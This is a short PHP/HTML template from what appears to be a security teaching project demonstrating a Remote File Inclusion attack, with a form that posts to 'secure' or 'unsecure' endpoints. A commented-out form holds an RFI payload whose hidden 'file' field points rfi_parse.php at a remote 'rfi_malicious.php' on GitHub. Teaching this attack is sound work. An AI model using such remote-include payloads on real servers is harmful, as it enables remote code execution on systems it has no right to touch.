<div class="container">
    <span>Attaque RFI</span>
<form method="POST" action=<?php echo ($secure == "true") ? "/devinci-cracks/rfi/secure" : "/devinci-cracks/rfi/unsecure" ?>>
    <button type="submit">Submit</button>
</form>
</div>
<!-- <form method="GET" action="view/rfi_parse.php">
    <input type="hidden" name="file"
        value="https://raw.githubusercontent.com/Kotsudes/devinci-cracks/main/rfi_malicious.php">
    <button type="submit">Submit</button>
</form> -->